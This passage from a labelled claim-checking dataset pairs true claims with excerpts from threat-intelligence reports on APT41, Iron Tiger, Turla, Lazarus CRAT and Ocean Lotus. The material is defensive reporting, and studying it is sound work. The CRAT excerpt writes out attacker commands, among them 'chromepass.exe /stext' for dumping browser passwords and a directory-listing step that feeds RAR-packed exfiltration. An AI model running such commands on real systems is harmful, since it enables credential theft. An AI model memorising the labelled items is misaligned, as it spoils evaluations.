storesyncsvc.dll. Here we see a toolmark from the tool ysoserial that was used to create the payload in the POC. The string Pwner76328858520609 is unique to the POC payload, indicating that APT41 likely used the POC as source material in their operation. In the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345.In both variations, the install.bat batch file was used to install persistence for a trial-version of Cobalt Strike BEACON loader named storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f).Storesyncsvc.dll was a Cobalt Strike BEACON implant (trial-version) which connected to exchange.dumb1[.]com (with a DNS resolution of 74.82.201[.]8) using a jquery malleable command and control (C2) profile. Within a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor with a different C2 address that uses Microsoft CertUtil, a common TTP that we’ve observed APT41 use in past intrusions, which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The usage of VMProtected binaries is another very common TTP that we’ve observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit.The Meterpreter downloader ‘TzGG’ was configured to communicate with 91.208.184[.]78 over port 443 to download the shellcode (MD5: 659bd19b562059f3f0cc978e15624fd9) for Cobalt Strike BEACON (trial-version).The downloaded BEACON shellcode connected to the same C2 server: 91.208.184[.]78. We believe this is an example of the actor attempting to diversify post-exploitation access to the compromised systems. ManageEngine released a short term mitigation for CVE-2020-10189 on January 20, 2020, and subsequently released an update on March 7, 2020, with a long term fix.This activity is one of the most widespread campaigns we have seen from China-nexus espionage actors in recent years. While APT41 has previously conducted activity with an extensive initial entry such as the trojanizing of NetSarang software, this scanning and exploitation has focused on a subset of our customers, and seems to reveal a high operational tempo and wide collection requirements for APT41. It is notable that we have only seen these exploitation attempts leverage publicly available malware such as Cobalt Strike and Meterpreter. While these backdoors are full featured, in previous incidents APT41 has waited to deploy more advanced malware until they have fully understood where they were and carried out some initial reconnaissance. In 2020, APT41 continues to be one of the most prolific threats that FireEye currently tracks. This new activity from this group shows how resourceful and how quickly they can leverage newly disclosed vulnerabilities to their advantage. Previously, FireEye Mandiant Managed Defense identified APT41 successfully leverage CVE-2019-3396 (Atlassian Confluence) against a U.S. based university. While APT41 is a unique state-sponsored Chinese threat group that conducts espionage, the actor also conducts financially motivated activity for personal gain.\n\n\n",

        "claim": "We found APT group Iron Tiger's malware compromising chat application Mimi’s servers.",
        "original_label": "true",
        "label": "true",
        "explain": "We noticed a server hosting both a HyperBro sample and a malicious Mach-O executable named “rshell.” HyperBro is a malware family used by Iron Tiger (also known as Emissary Panda, APT27, Bronze Union, and Luckymouse), an advanced persistent threat (APT) group that has been performing cyberespionage for almost a decade, and there have been no reports of this group associated with a tool for Mac operating systems (OS). We analyzed the Mach-O sample and found it to be a new malware family targeting the Mac OS platform. We also eventually found samples compiled for the Linux platform that belongs to the same malware family. We noticed that a chat application named MiMi retrieved the rshell executable, an app we came across recently while investigating threat actor Earth Berberoka. We noticed Iron Tiger controlling the servers hosting the app installers of MiMi, suggesting a supply chain attack. Further investigation showed that MiMi chat installers have been compromised to download and install HyperBro samples for the Windows platform and rshell samples for the Mac OS platform. While this was not the first time the technique was used, this latest development shows Iron Tiger’s interest in compromising victims using the three major platforms: Windows, Linux, and macOS. Infection vector MiMi (mimi = 秘密 = secret in Chinese) is an instant messaging application designed especially for Chinese users, with implementations for major desktop and mobile operating systems: Windows, macOS, Android, and iOS. The desktop versions are developed with the help of ElectronJS framework, which is a cross-platform framework based on Node.js, allowing the developers to create applications with HTML, Javascript (JS), and CSS. We already came across an abuse of this application during the Earth Berberoka investigation. However, compared to Earth Berberoka’s routine wherein the threat actor set up a fake website to deliver a malicious chat application, in this instance Iron Tiger compromised the server hosting the legitimate installers for this chat application for a supply chain attack. Contrary to the fake website, the links to the mobile versions of the application for Android and iPhone worked. Also, we could not find anything malicious in the latest Windows installer. In June, we were able to download the macOS installer for the 2.3.2 version of MiMi chat and verified it as genuine. After downloading it again later, we found that the installer was replaced with a malicious version retrieving the rshell sample. This was proof that the attackers had direct access to the installers‘ host server, and that they were monitoring the versions published by the MiMi app developers in order to quickly insert a backdoor. In this case, we can see that it took an hour and a half for the attackers to modify the legitimate installer and add malicious code to it. For older versions, it took the attackers one day to inject its modifications. The modification occurs in the electron-main.js file, which contains a block of code beginning with “eval(function(p,a,c,k,e,d)”, suggesting we are dealing with Dean Edwards packer. Once deobfuscated, we saw that the inserted code downloads rshell from the IP address 139[.]180[.]216[.]65 and executes it once run on the macOS platform. The delivered rshell malware is a new family we will discuss in a later section. After looking at previous versions of this installer, we found that the first compromised version was 2.3.0, built on May 26, 2022, while the previous version (2.2.10, published on May 6, 2022) was clean. This led is to our first assumption that Iron Tiger had access to the Mimi chat developer's backend between the two dates in May. However, a further look at our telemetry revealed older installers that have been compromised, this time aimed at Windows OS. Version 2.2.0 and 2.2.1 (both built on November 23, 2021), had similar additions to the electron-main.js file. We saw that one executable, one dynamic link library (DLL), and one binary file were being downloaded into the temporary directory before running the executable. This is the typical way that this threat actor loads its files, exploiting DLL side-loading vulnerabilities in legitimate and usually signed executables. In this case, the exploited executable belongs to the DESlock+ product, as described last year when we analyzed another Iron Tiger campaign, using malware HyperBro.The rshell executable is a standard backdoor and implements functions typical of similar backdoors: We found multiple samples of this particular backdoor, with some of them in the Mach-O format (macOS platform), while others were in the ELF format (Linux platform). The oldest sample we found was uploaded in June 2021, with the first victim reported in mid-July 2021. The OS information collection routine gathers the following information: Once collected, the backdoor “packs” them into a Binary JSON (BSON) message and sends it over TCP to the C&C in clear (unencrypted) form. The message received from the C&C is also in BSON format and contains the following fields: The client also regularly sends a packet of type ‘keepalive’ to the C&C. Running the DMG installer on a macOS machine, the user is shown several warnings before the trojanized app is installed and run. At first, Safari web browser asks the user to allow downloads from the given website. After choosing “Allow,” downloading, and executing the DMG installer, another warning message about an unverified developer is displayed. To override this warning, the user must open “System Preferences” and “Security & Privacy” tabs and click on “Open Anyway.”Afterward, one more warning about the unverified developer is displayed. This time, however, the “Open” button appears in the prompt so the application can finally start. We confirmed that both the legitimate and the malicious versions of the chat installer were unsigned, which means the users of MiMi chat were probably used to all these extra steps to finally install the application despite all the macOS watchguards. The HyperBro malware family has been around since 2017 and has been extensively analyzed. It was updated in mid-2019, which we described in detail in our Operation DRBControl paper. The version used in this campaign is no different from what we already described in our previous Iron Tiger investigation. The only noteworthy element is the Authenticode signature of dlpprem32.dll, which is signed by a (now) revoked certificate belonging to “Cheetah Mobile Inc.” The said company was formerly known as Kingsoft Internet Software Holdings Limited, wherein during our previous investigation on the group, we already found one HyperBro DLL signed by a certificate belonging to Kingsoft. We found 13 different targets while following our sensors‘ data. The only targeted countries were Taiwan and the Philippines: five targets of HyperBro (four in Taiwan and one in the Philippines). Meanwhile, we found eight targets for rshell: six in Taiwan, one in the Philippines, and one being in Taiwan and the Philippines. While we were unable to identify all the targets, these targeting demographics demonstrate a geographical region of interest for Iron Tiger. Among those targets, we could only identify one of them: a Taiwanese gaming development company. Interestingly, we found a sample from the Reptile rootkit framework in that same company, as well as network requests to a subdomain that belongs to Earth Berberoka’s infrastructure. We also noticed network requests from a Taiwanese IT development company to the subdomain trust[.]veryssl[.]org, and the subdomain center.veryssl[.]org is a C&C for one of the rshell samples we found. This suggests the company could be compromised by the same threat actor.We attribute this campaign to Iron Tiger for multiple reasons. First, the dlpprem32.dll file linked to HyperBro shares certain characteristics (specifically imphash, RICH header) with previous samples already attributed to the group. Also, the file names involved in the decoding and loading of HyperBro are similar to those we witnessed during our investigation last year. Second, one of the Linux rshell samples used the IP address 45[.]142[.]214[.]193 as its C&C. In 2020, that IP address had a particular reverse DNS: nbaya0u2[.]example[.]com. During our Operation DRBControl investigation, we found a HyperBro sample that had 138[.]124[.]180[.]108 as its C&C. This second IP address had nbaya0u1[.]example[.]com as its reverse DNS. However, as the rshell sample was found in 2021, we initially did not find this correlation strong enough to attribute the rshellmalware family to Iron Tiger. Despite the fact that same state-sponsored threat actors tend to share their malware tools (such as gh0st, PlugX, and Shadowpad), this is not the case for HyperBro as far as we know. The fact that we found this malware being used in this campaign is an additional indicator pointing towards Iron Tiger. We also found some links to Earth Berberoka. From one of the victims where we found an rshell sample, we also found a binary belonging to the Reptile rootkit framework, a rootkit identified as part of the arsenal of Earth Berberoka. We also noticed network communications from this victim to a subdomain of Earth Berberoka, suggesting it could have been previously compromised by this threat actor. We noticed a different system in the same situation, as well as the network connections to the subdomain trust[.]veryssl[.]org domain name. One of the rshell samples had center[.]veryssl[.]org as the C&C. Both findings suggest that those victims could be compromised by both threat actors, or that Earth Berberoka is actually a subgroup of Iron Tiger. As a reminder, while investigating Earth Berberoka, we found multiple links to Iron Tiger that we detailed in our research.\n\n\n",

        "explain": "You may remember that in autumn 2019 we published a story about how a COMpfun successor known as Reductor infected files on the fly to compromise TLS traffic. If you’re wondering whether the actor behind the malware is still developing new features, the answer is yes. Later in November 2019 our Attribution Engine revealed a new Trojan with strong code similarities. Further research showed that it was obviously using the same code base as COMPFun. The campaign operators retained their focus on diplomatic entities, this time in Europe, and spread the initial dropper as a spoofed visa application. It is not clear to us exactly how the malicious code is being delivered to a target. The legitimate application was kept encrypted inside the dropper, along with the 32- and 64-bit next stage malware. We observed an interesting C2 communication protocol utilizing rare HTTP/HTTPS status codes (check IETF RFC 7231, 6585, 4918). Several HTTP status codes (422-429) from the Client Error class let the Trojan know what the operators want to do. After the control server sends the status “Payment Required” (402), all these previously received commands are executed. The authors keep the RSA public key and unique HTTP ETag in encrypted configuration data. Created for web content caching reasons, this marker could also be used to filter unwanted requests to the C2, e.g., those that are from network scanners rather than targets. Besides the aforementioned RSA public key to communicate with the C2, the malware also uses a self-generated AES-128 key. We should mention here once again that the COMPfun malware was initially documented by G-DATA in 2014; and although the company did not identify which APT was using the malware. Based mostly on victimology, we were able to associate it with the Turla APT with medium-to-low level of confidence. ts functions include the ability to acquire the target’s geolocation, gathering host- and network-related data, keylogging and screenshots. In other words, it’s a normal full-fledged Trojan that is also capable of propagating itself to removable devices. As in previous malware from the same authors, all the necessary function addresses resolve dynamically to complicate analysis. To exfiltrate the target’s data to the C2 over HTTP/HTTPS, the malware uses RSA encryption. To hide data locally, the Trojan implements LZNT1 compression and one-byte XOR encryption. ts functions include the ability to acquire the target’s geolocation, gathering host- and network-related data, keylogging and screenshots.

To exfiltrate the target’s data to the C2 over HTTP/HTTPS, the malware uses RSA encryption. To hide data locally, the Trojan implements LZNT1 compression and one-byte XOR encryption. The following files are dropped to the disk in addition to the original application that the malware tries to mimic: The dropper urges users to run the file as administrator (using messages such as “need to run as admin”), then drops a version corresponding to the host’s architecture and sets the file system timestamp to 2013.12.20 22:31. Interestingly, the dropper’s abilities aren’t limited to PE lures; as an alternative, this stage is also able to use .doc and .pdf files. In such cases, the dropper will open the files using the “open” shell command instead of running the legitimate spoofed executable application.The analysis below is based on the 32-bit sample from the table above. The legitimate ExplorerFrame.dll.mui is a language resource for the ExplorerFrame.dll file used by Windows Explorer. As usual in this malware family’s code, a huge number of short standalone functions return all the readable strings. This is done to complicate analysis by not allowing the strings to be visible at a glance for researchers. The module’s preparation stage dynamically resolves all required Windows API function addresses into corresponding custom structures. Afterwards the malware uses indirect function calls only. The module obtains the processor architecture (32- or 64-bit) and Windows OS version. It includes a number of anti-analysis checks for virtual machine-related devices (VEN_VMWARE, VBOX_HARDDISK, Virtual_DVD_ROM, etc.) to avoid controlled execution. It also notes which security products are running on the host (Symantec, Kaspersky, Dr.Web, Avast). Before every communication with the C2, the malware checks if software such as debuggers (WinDbg, OllyDbg, Visual Studio) and host (Process Explorer or Monitor, etc.) or network monitoring (Wireshark, TCPView, etc.) programs are running. It also checks for internet connectivity and does not attempt to communicate if the checks fail. The DLL also checks for potentially available launch processes that it can inject itself into. In the case of PaymentRequired, this could be system, security product or browser processes. Then the malware forms the corresponding code to drop files, delete files, etc. The last step in the initialization procedure is to decrypt and decompress the configuration file. Decryption is done via a one-byte XOR using the 0xAA key, followed by decompression using the LZNT1 algorithm. From the configuration, the malware parses the RSA public key, ETag and IP addresses to communicate with its control servers. Firstly, the module generates the following: The module then chooses a process to inject the code into, in order of decreasing priority, starting from Windows (cmd.exe, smss.exe), security-related applications (Symantec’s nis.exe, Dr.Web’s spideragent.exe) and browsers (IE, Opera, Firefox, Yandex browser, Chrome). The main thread checks if the C2 supports TLS in its configuration. If it does, communication will be over HTTPS and port 443; otherwise, the HTTP protocol and port 80 are used. The first GET request sent contains an ETag “If-Match” header that is built using data from its decrypted configuration. ETags are normally used by web servers for caching purposes in order to be more efficient and save bandwidth by not resending redundant information if an ETag value matches. The implementation of ETags means the C2 may ignore all requests that are not sent from its intended targets if they don’t have the required ETag value.If initialization is successful, the malware starts one more thread for dispatching Windows messages, looking for removable devices related to a WM_DEVICECHANGE event. The module runs its own handlers in the event of a USB device being plugged into or unplugged from the host.The user’s activity is monitored using several hooks. All of them gather the target’s data independently of any C2 command. Keystrokes are encrypted using the RSA public key stored in the configuration data and sent once every two seconds, or when moreа than 512 bytes are recorded. These 512 characters also include left mouse button clicks (written as the “MSLBTN” string) and Windows title bar texts. For clipboard content, the module calculates an MD5 hash and if it changes, encrypts the clipboard content with the same RSA public key and then sends it. In a separate thread, the Trojan takes a bitmap screenshot using the GDIPlus library, compresses it with the LZNT1 algorithm, encrypts it using the key from the configuration data and sends it to the control server. A screenshot will be taken of the target and sent anyway, independently of any C2 command. There are several choices – albeit not major additional technical ones – that the malware author made which we consider to be noteworthy. The COM-hijacking-based persistence method injects its corresponding code and structure as a parameter into a legitimate process’s memory. The malware geolocates victims using legitimate web services: geoplugin.net/json.gp, ip-api.com/json and telize.com/geoip. The unusual thread synchronization timeout calculation in the HTTP status thread is peculiar. Mathematically, the partial sum of the series is precisely:This series, in the case of a full sum, is just a representation of the exponent. The developers probably used the exponent to make timeouts in the communication thread more unpredictable and grow at a fast rate, and the compiler calculated it this way. We saw innovative approaches from the COMpfun developers twice in 2019. First, they bypassed TLS encrypted traffic via PRNG system function patching, and then we observed a unique implementation of C2 communications using uncommon HTTP status codes. The malware operators retained their focus on diplomatic entities and the choice of a visa-related application – stored on a directory shared within the local network – as the initial infection vector worked in their favor. The combination of a tailored approach to their targets and the ability to generate and execute their ideas certainly makes the developers behind COMPFun a strong offensive team.\n\n\n",

        "claim": "Cisco Talos has observed a new version of a remote access trojan (RAT) family known as CRAT, which apart from prebuilt RAT capabilities, can download and deploy additional malicious plugins on the infected endpoint, and has been attributed to the Lazarus APT Group in the past.",
        "original_label": "true",
        "label": "true",
        "explain": "Cisco Talos has recently discovered a new version of the CRAT malware family. This version consists of multiple RAT capabilities, additional plugins and a variety of detection-evasion techniques. In the past, CRAT has been attributed to the Lazarus Group, the malicious threat actors behind multiple cyber campaigns, including attacks against the entertainment sector. Indicators and tactics, techniques and procedures (TTPs) discovered by this investigation resemble those of the Lazarus Group.The attack consists of a highly modular malware that can function as a standalone RAT and download and activate additional malicious plugins from its C2 servers. Cisco Talos has discovered multiple plugins so far, consisting of ransomware, screen-capture, clipboard monitoring and keylogger components. This attack demonstrates how the adversary operates an attack that: The first version of CRAT has been known to be distributed via malicious HWPs. The HWPs masquerade as a COVID-19 themed document pertaining to an infectious disease management support group from South Korea. The HWPs consisted of an exploit for CVE-2017-8291 used to activate malicious shellcode. The shellcode would then download and execute CRATv1 on the infected endpoint. The distribution vector of the new version of CRAT (v2) is currently unknown. However, it is highly likely the attackers may have re-used a maldoc-based infection vector to spread CRATv2 as well. Shellcode executing PowerShell to download and activate CRATv1 via regsvr32. Before we analyze the attack it is important to understand the extensive measures taken by the attackers to conceal the RAT executables. The RAT is highly obfuscated in terms of: The use of multiple obfuscations signifies the attackers confidence in selective obfuscation rather than the use of packers as a means of evasion. Many detection systems look for the presence of a packer using techniques such as entropy analysis, Import API analyses, etc. Selective obfuscation of code and strings prevents these systems from detecting the malware solely on the basis of the obfuscations. It is also likely that this group of attackers employs a modular build system that obfuscates different aspects of malware. Different modules can thus be used in conjunction to produce a combination of obfuscations for the same malware.The attackers have also used file names and export API names in the CRAT DLLs to masquerade the RAT as a benign application's library. Some examples of the exported function names are: The implant performs checks to verify its execution on an allowed endpoint. The implant uses a variety of criteria to identify a blocklisted system by utilizing:The implant also checks for indicators that the process is being debugged (including CheckRemoteDebuggerPresent). If the infected endpoint fails any of the anti-infection checks, the implant quits execution. The blocklists are provided at the end of this post. The CRAT DLL ensures it resides in the desired process on the infected endpoint. Depending on the MS Windows OS version, it will inject and reflectively-load itself into the right process. The processes trojanized by CRAT v2 are:Before detailing CRAT's capabilities, it is important to illustrate the communication mechanism used by CRAT to talk to its C2 servers. Both versions of CRAT use HTTP to communicate with the C2 servers. The data sent to the C2 is in the form of URL-encoded form data and may consist of 3 types of requests: CRAT uses the following algorithm to encode the data before sending it out via the HTTP POST request: The format of the response to the C2 is:The C2 server will respond with a JSON containing command codes and supporting data to be recognized by the implant to execute a corresponding RAT capability.The CRAT malware consists of multiple RAT capabilities that allow it to be highly versatile and dangerous. CRAT executes these capabilities by receiving command codes and corresponding data from the C2 in the form of JSONs communicated over HTTP. Apart from the introduction of a wide variety of new RAT capabilities in CRAT version 2 (vs CRAT version 1), the biggest update is the spin-off of key RAT capabilities into plugin modules. These plugins (DLLs) are downloaded on-the-fly by CRATv2 and injected into specific processes running on the infected endpoint. Enumerate drives using the 'dir' command: cmd /c “dir /s >> %temp%\\error.log” Where custom_prefix = file name prefix specified by the C2 E.g. cmd /c ”dir C:\\ /s >> C:\\Users\\AppData\\Local\\Temp\\BLAHerror.log” Implant constructing the dir cmd to be executed. The log file is then rolled up into a ”.rar” archive using a pre-existing installation of a RAR archiver program using the command: a -k -r -s -ibck -m5 The RAR archive is then read to memory and exfiltrated to the C2, followed by deletion of the .rar and log files. CRAT has the capability to read the contents of the file specified by the C2 and exfiltrate these to the C2. The write file capability consists of writing the data received from the C2 to a temporary file in the %temp% folder: %temp%/.tmp The implant will also timestomp the tmp file to either a hardcoded value or copy the filetimes from a system file such as %windir%\\system32\\user32.dll. Execute commands with two variations of the functionality: Open up a reverse command shell for arbitrary command execution using Windows pipes. This capability allows the C2 to specify delays between consecutive command queries from the implant to the C2 for: Execute chromepass.exe with the /stext switch to obtain the usernames and passwords stored in Google Chrome. The credentials are dumped to a text file which is read and exfiltrated to the C2. Command format: chromepass.exe /stext CRAT contains a RAT functionality that implements a custom-built File Explorer sub-module. The C2 specifies the parent functionality command code and an additional sub-command code to specify the sub-capability to be executed in the file explorer. The file explorer sub-module contains the following sub-capabilities: Downloads and installs a malicious plugin from the C2. The plugin is placed in a standard directory specified by the C2, and locations may include:The RAT comes with an uninstallation routine built into it as well. This routine can be triggered in response to a command issued by the C2 or if the endpoint fails its anti-infection checks. The uninstallation routine consists of:In addition to the RAT capabilities, CRAT also consists of additional functionalities that are implemented as part of independent threads in the infected process:With version 2, the attackers have evolved CRAT into a modular RAT with the ability to download and activate additional malicious plugins (DLLs) on the infected endpoint. The first version of CRAT had these plugin capabilities implemented within the RAT. Cisco Talos has discovered these capabilities so far:The screen capture plugin will capture the current foreground window (every second or so) and save the screenshot to a .tmp file in a hardcoded directory. The screenshot is saved in TIFF file format. Since TIFF is widely supported by scanning and faxing systems, the malicious screenshots may be mis-identified as document scans by a forensic analyst instead of malicious screen captures. The saved screenshot file is also XORed using a variable length XOR key hardcoded into the plugin as saved to add a further layer of obfuscation. Sample screenshot captured by the plugin.This plugin will read the clipboard data and write the contents of the clipboard to a log file. The format of the clipboard data logged is: \r\n[YYYY-mm-DD HH:MM:SS]\r\n The data is stored in a seemingly benign file location such as: %localappdata%\\Google\\Chrome\\Application\\Update.chk Clipboard monitor implant getting clipboard data. The keylogger plugin monitors the state of all the alphanumeric keys pressed. It also logs the following keys:The keystrokes are logged to another seemingly benign file on the endpoint such as: %localappdata%\\Google\\Chrome\\Application\\Update.cert.We also discovered a ransomware plugin that encrypts specific file extensions on the infected endpoint. Traditionally ransomware encrypts files on the infected endpoint using a combination of asymmetric and symmetric encryption. This plugin is different. It locks files into individually created archives using randomly generated passwords. The passwords are then encrypted using an embedded public key (part of an embedded pub certificate). Once the infected user gets access to the private key (after the ransom has been paid), the private key can be plugged into the accompanying decryptor .exe that decrypts the archive passwords and subsequently unpacks the original files from the archive. The plugin performs the following housekeeping actions before it begins encrypting files on the endpoint: The following file extensions are targeted by the ransomware plugin. The ransomware excludes certain file and folder names from encryption to ensure the stability of the Operating System (listed in the IOCs section).The plugin uses the following sequence of steps to encrypt/lock files on the infected endpoint:The ransomware plugin performs the following activities after it has encrypted all the targeted files on the system:The ransomware plugin also communicates with a C2 server URL, sending it details (as JSONs) such as: In addition to the CRATv2 DLLs, Cisco Talos discovered multiple loaders related to the RAT family. This section provides an overview of these components.Apart from EXE based loaders, this CRAT also uses DLL based loaders. The DLL loaders carry out the same function of decoding the CRAT DLL and reflectively injecting it into a specified process. The differences are in the persistence techniques used:Cisco Talos discovered another variant of the DLL-based loader that acts as a packager as well. Depending on the option specified, the loader will either: Package CRAT: This variant of the loader also has the capability to create an archive from a specified file on disk. This functionality may be used to create deployment packages for another part of the infection chain. Syntax used:The earliest versions of CRAT discovered were compiled in April 2020. The following is a timeline of events in the lifecycle of CRAT with the introduction/modification of its components at different stages of the engineering process.Earliest known version of CRAT (v1) created. Limited capabilities and basic string obfuscation. Downloaded by malicious HWPs from an infected Wordpress website.Attribution is hard. Although prior reporting has linked CRAT to Lazarus, there has been no solid evidence to back these claims. There are however some aspects of the attack that resemble Lazarus' practices:This investigation illustrates the continued use and evolution of the CRAT implant. CRAT started out as a nascent RAT with limited capabilities, which evolved to introduce a wide variety of malicious capabilities including a full-fledged File Explorer. The latest iteration of CRAT now has the capability to download and deploy arbitrary plugins on the infected endpoint. These plugins have capabilities ranging from spying to encrypting and holding the user's data hostage. The ransomware plugin in particular has the potential to cause extensive loss of services, time and money to affected organizations. The continued evolution of loaders used to deploy CRAT also indicates that the attackers are actively developing novel ways of infecting their targets. The extensive use of obfuscation, patching and anti-infection techniques indicates that the attackers have taken great care towards evading detection systems. Thus, while static and network-based detection is important, it should be complimented with system behavior analysis and endpoint.Ways our customers can detect and block this threat are listed below.

        "claim": "Amnesty International's investigation identified a spyware attack campaign against Vietnamese human rights defenders from 2018 to 2020, attributing these attacks to the Ocean Lotus group, which highlights a broader pattern of online repression and violation of human rights in Vietnam.",
        "original_label": "true",
        "label": "true",
        "explain": "A new Amnesty International investigation has identified a campaign of spyware attacks targeting Vietnamese human rights defenders (HRDs) from February 2018 to November 2020. Amnesty International’s Security Lab attributes these attacks to an attack group known as Ocean Lotus. The group has been active since at least 2014, targeting the private sector and HRDs. The spyware attacks investigated and identified by the Security Lab are the latest evidence of a crackdown on freedom of expression in Viet Nam and against Vietnamese activists outside the country.Human rights are increasingly under attack both offline and online in Viet Nam. Over the past 15 years, repression linked to online activity has intensified, leading to a wave of harassment, intimidation, physical assault, and prosecution. Amnesty International has documented multiple cases of the arrest and prosecution of HRDs in Viet Nam in retaliation for their online expression since 2006. That year, former prisoner of conscience Truong Quoc Huy was arrested at an internet café in Ho Chi Minh City. Many activists and bloggers have been convicted for “conducting propaganda against the state.” Human rights blogger Nguyen Ngoc Nhu Quynh (Mother Mushroom) was sentenced to 10 years in prison in June 2017 on such charges. Activists and bloggers also face frequent physical assaults by officials or government-connected thugs. Police place activists under house arrest or briefly detain them to prevent them from participating in public events. The government also uses travel bans to prevent activists and HRDs from going abroad and engaging with the international community. In December 2020, Amnesty International published “Let Us Breathe”, a report documenting the widespread criminalization, online harassment and physical attacks faced by activists and bloggers and the rising numbers of individuals detained for peacefully expressing themselves online. Amnesty International also revealed the increasing complicity of tech giants Facebook and Google in the Vietnamese authorities’ harsh censorship regime, whereby any expression of peaceful dissent is liable to be blocked or otherwise restricted. Activists and HRDs are jailed, harassed, attacked, and censored into silence on the basis of vague and sweeping laws that do not comply with international human rights standards. In January 2019, a controversial Law on Cybersecurity came into effect in Viet Nam, granting the government broad powers to limit online freedom, to compel technology companies to hand over vast amounts of data and to censor users’ content. The cyber-security industry, comprised of individual and company-based researchers, routinely researches and publishes information about attack groups targeting companies and governments. The industry often gives informal names to groups they continuously track based on each group’s unique tactics and tools. Ocean Lotus (also commonly called APT32 or APT-C-00) is one of these groups. The first known Ocean Lotus attack happened in 2014. It targeted US-based NGO Electronic Frontier Foundation (EFF), the Associated Press international news organization and two Vietnamese activists. This group was named Ocean Lotus in a report from the Chinese company Qihoo 360 in May 2015. In 2017, the American cyber-security company FireEye published a report linking the 2014 EFF and other attacks to this same Ocean Lotus. Over the years, Ocean Lotus has developed a sophisticated spyware toolkit comprised of several variants of Mac OS spyware, Android spyware and Windows spyware. They also strategically compromise websites in order to identify visitors and conduct further targeting. More recently, Ocean Lotus was found creating fake media websites based on content automatically gathered online. A significant part of the group’s activities is the targeting of HRDs and civil society. In 2017, the cyber-security company Volexity revealed that over 100 websites were compromised, including many belonging to human rights organizations from Viet Nam, in an attack campaign that they attributed to Ocean Lotus. Numerous other spyware attacks linked to Ocean Lotus against human rights organizations have also been reported, such as the targeting of the Cambodian human rights organization, LICADHO in 2018. The cyber-security company FireEye describes Ocean Lotus’ operations as “aligned with Vietnamese state interests” based on the list of targeted companies and civil society groups they identified. In December 2020, Facebook published a threat report linking Ocean Lotus’ activities with a Vietnamese company named CyberOne Group. Although Amnesty International was unable to independently verify any direct connection between Ocean Lotus and CyberOne or with the Vietnamese authorities, the attacks described in this investigation confirm a pattern of targeting Vietnamese individuals and organizations. The investigation conducted by Amnesty International’s Security Lab revealed that two HRDs and a non-profit human rights organization from Viet Nam have been targeted by a coordinated spyware campaign. This spyware allows to fully monitor a compromised system, including reading and writing files, or launching other malicious programs. Bui Thanh Hieu is a blogger and pro-democracy activist who goes by the name “Nguoi Buon Gio” (The Wind Trader). He writes about social and economic justice and human rights. He is also critical of the Vietnamese government’s policies and actions regarding its relations with China, including the dispute over sovereignty in the South China Sea. Due to his writing and activism, the licence for an Internet Café he owned in Ha Noi has been revoked and he has been repeatedly subjected to reprisals. He was arrested along with activists Pham Doan Trang and Nguyen Ngoc Nhu Quynh in 2009 and was kept in police custody for 10 days for “abusing democratic freedoms to infringe upon the interests of the State.” In January 2013, Bui Thanh Hieu reported on the trial of 14 dissidents in Viet Nam and was arrested and released a few days later. He has since left Viet Nam and has lived in exile in Germany since 2013. Vietnamese Overseas Initiative for Conscience Empowerment (VOICE) is a non-profit organization supporting Vietnamese refugees and promoting human rights in Viet Nam. It was established in 1997 in the Filipino capital of Manila as a legal aid office, before formally registering in the United States in 2007. The organization continues to operate out of Manila and has helped 3,000 Vietnamese refugees resettle in third countries. Since 2011, VOICE has operated an internship programme to equip Vietnamese people with knowledge, skills, and tools to become effective activists. The organization has faced reprisals from Vietnamese authorities several times. Staff at VOICE told Amnesty International that employees and interns have been harassed, banned from travelling, and have had their passports confiscated when they have returned to Viet Nam. Furthermore, state-owned media has run an unsubstantiated smear campaign against VOICE, claiming that the organization is a terrorist group. A blogger residing in Viet Nam has also been confirmed as an Ocean Lotus target by the Security Lab, but due to security concerns their name has been omitted. They are known to have spoken out publicly about the Dong Tam incident on 9 January 2020, when approximately 3,000 security officers from Ha Noi raided Dong Tam village and killed the 84- year-old village leader Le Dinh Kinh. Three police officers were also killed. The Dong Tam incident sparked a national outcry in Viet Nam. Activists and bloggers were at the forefront of the public debate online, prompting a nationwide crackdown on online expression by the government. VOICE and the two bloggers all received emails containing spyware between February 2018 and November 2020. These emails pretended to share an important document. They either contained spyware as an attachment or as a link. Once downloaded and launched on the victim’s computer, the spyware would then open a decoy document in line with what the email pretended to share to trick the victim in believing the file was benign. Screenshot of the email sent to VOICE in April 2020 The spyware identified by the Security Lab were either for Mac OS or Windows systems. The Windows spyware was a variant of a malware family called Kerrdown and used exclusively by the Ocean Lotus group. Kerrdown is a downloader that installs additional spyware from a server on the victim’s system and opens a decoy document. In this case, it downloaded Cobalt Strike, a commercial spyware toolkit developed by the American company Strategy Cyber and routinely used to lawfully audit the security of organizations through simulated attacks. It allows an attacker full access to the compromised system including executing scripts, taking screenshots or logging keystrokes. Unlicensed versions of Cobalt Strikes have been increasingly used by attack groups, including Ocean Lotus, over the past three years. Example of Windows Spyware Infection Chain from one of the emails received The Mac OS Spyware was a variant of a malware family for Mac OS developed and used exclusively by Ocean Lotus, analysed by Trend Micro in April 2018 and November 2020. It allows the perpetrator to access system information, download, upload or execute files and execute commands. Our investigation was not able to attribute Ocean Lotus’ activities to any company or government entity. However, the extensive list of people and organizations targeted by Ocean Lotus over years shows that it has a clear focus on targeting human rights and media groups from Viet Nam and neighbouring countries. This raises questions about whether Ocean Lotus is linked to Vietnamese state actors. The consistent evidence linking Ocean Lotus to Viet Nam should trigger the Vietnamese authorities to undertake an impartial, thorough and independent investigation into the group's unlawful activities and human rights abuses. The targeting of human rights defenders using digital surveillance technology is unlawful under international human rights law. Unlawful surveillance violates the right to privacy and impinges on the rights to freedom of expression and opinion, of association and of peaceful assembly. Both the Universal Declaration of Human Rights and the International Covenant on Civil and Political Rights protect these rights. The Covenant guarantees the right to hold opinions without interference and the right to free expression (Article 19) and guards against arbitrary and unlawful intrusion of privacy (Article 17). International law and standards also require that any interference by the state on the right to privacy should be lawful, necessary, proportional, and legitimate. States are required to ensure that individuals whose rights have been violated have access to remedy (Article 2(3)). This includes the positive obligation to take appropriate measures to prevent, punish, investigate or redress the harm caused by such acts by private persons or entities. This targeted surveillance led by Ocean Lotus is part of a broader pattern of censorship and criminalization of online expression in Viet Nam, described in depth in Amnesty International’s “Let Us Breathe” report. Along with the censorship of political content involving the complicity 